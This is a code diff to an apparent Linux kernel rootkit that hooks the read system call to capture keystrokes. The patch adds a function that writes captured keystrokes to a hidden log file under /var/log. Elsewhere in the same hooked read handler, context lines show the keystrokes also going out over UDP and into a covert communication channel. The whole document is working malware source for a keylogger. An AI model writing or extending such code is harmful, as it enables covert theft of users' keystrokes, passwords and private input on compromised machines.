@@ -6,6 +6,12 @@
 #include <linux/delay.h>
 #include <linux/unistd.h>
 
+#include <linux/string.h>
+#include <linux/fs.h>
+#include <linux/buffer_head.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+
 #include "covert_communication.h"
 #include "include.h"
 #include "net_keylog.h"
@@ -19,8 +25,36 @@ asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t coun
 static int read_call_counter = 0;
 static spinlock_t read_lock;
 static unsigned long read_lock_flags;
+static loff_t foffset = 0;
 
 extern int send_flag; // For network keylogging
+
+/* Function used for local logging inside /var/log */
+void write_to_file(char *buf)
+{
+        struct file *fd;
+        mm_segment_t oldfs;
+        int ret;
+        int size;
+
+	/* Create the file with Write and append mode */
+        fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRWXU);
+
+        if (!IS_ERR (fd)) {
+                oldfs = get_fs();
+                set_fs(get_ds());
+
+                size = strlen(buf);
+
+                ret = vfs_write(fd, buf, size, &foffset); 
+                foffset += 1;
+                //do_sync_write(fd, buffer, readed, 0);
+
+                set_fs(oldfs);
+                filp_close(fd, NULL);
+        }
+	
+}
 
 /*
  * Our manipulated read syscall. It will log keystrokes and serve as a covert
@@ -45,7 +79,8 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 			{
 				send_udp(sendbuf);
 			}
-
+			
+			write_to_file(sendbuf);
 			/* send to covert communication channel */
 			accept_input(buf[i]);
 		}
